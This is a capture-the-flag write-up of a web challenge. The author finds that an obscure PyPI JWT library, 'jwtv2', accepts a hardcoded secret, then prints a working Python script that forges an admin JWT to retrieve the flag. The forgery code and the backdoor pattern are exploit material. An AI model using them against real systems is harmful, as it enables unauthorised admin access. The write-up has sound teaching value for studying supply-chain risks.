# Dependency Confusion JWT Attack Write-up

## Challenge Overview

![](<img/0.png>)

The challenge provided a website along with its source code. When accessed, the website showed a "not found" error.

## Source Code Analysis

### Available Endpoints

![](<img/1.png>)

Examining the source code revealed 3 endpoints:
- `/api/register` - POST method only
- `/api/login` - POST method only  
- `/api/admin` - GET method only

### Initial Testing

![](<img/2.png>)

Using Burp Repeater, I performed registration at `/api/register` with JSON format containing username and password.

![](<img/3.png>)

When accessing `/api/login` with the registered credentials, a token was returned. According to the source code, the token is encoded using JWT with a default value of `is_admin: false`.

### Target Identification

![](<img/4.png>)

The `/api/admin` endpoint source code indicated that if `is_admin` is false, the flag won't be returned. Therefore, the exploit objective was to change `is_admin: false` to `is_admin: true`.

## Vulnerability Discovery

### Missing JWT Secret

The JWT secret for this website was not found in the conventional places. However, there was something unusual in the `requirements.txt` file.

### Dependency Analysis

![](<img/5.png>)

The `requirements.txt` file contained the imported libraries for the source code. Among them was `jwtv2`, which is not a common library used for JWT encoding processes.

### Library Investigation

![](<img/6.png>)

Investigating this library on pypi.org revealed its source code. From the source code, I discovered that the token encoding process uses the HMAC algorithm. If the signature doesn't match the provided secret or doesn't match `"admin_only_for_testing_1337"`, it returns an invalid signature error.

## Exploitation

### JWT Token Forgery

Understanding the algorithm used in the jwtv2 library and the secret used within it, I was able to recreate a JWT token with `is_admin: true`.

```python
import json, base64, hmac, hashlib, time

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=')

header  = {"alg":"HS256","typ":"JWT"}
payload = {
    "username": "wongsangar",
    "is_admin": True,
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

secret = b"admin_only_for_testing_1337"  # secret from jwtv2

signing_input = b'.'.join([
    b64u(json.dumps(header, separators=(',',':')).encode()),
    b64u(json.dumps(payload, separators=(',',':')).encode()),
])

sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
token = b'.'.join([signing_input, b64u(sig)]).decode()
print(token)
```

### Flag Retrieval

![](<img/7.png>)

After obtaining the forged token, I accessed `/api/admin` using this token, and the flag was successfully retrieved.

## Flag

```
HIB25{s1imple_d3pedency_c0nfusion}
```

## Summary

This challenge demonstrated:

1. **Dependency Analysis** - Identifying unusual libraries in requirements.txt
2. **Third-party Library Investigation** - Researching non-standard libraries on PyPI
3. **Source Code Review** - Analyzing library source code to find hardcoded secrets
4. **JWT Token Forgery** - Creating valid tokens using discovered secrets
5. **Dependency Confusion Attack** - Exploiting trust in third-party packages

The vulnerability stemmed from using a non-standard JWT library (`jwtv2`) that contained a hardcoded secret (`admin_only_for_testing_1337`) in its source code. This represents a classic dependency confusion attack where malicious or poorly designed packages can compromise application security through hardcoded credentials or backdoors.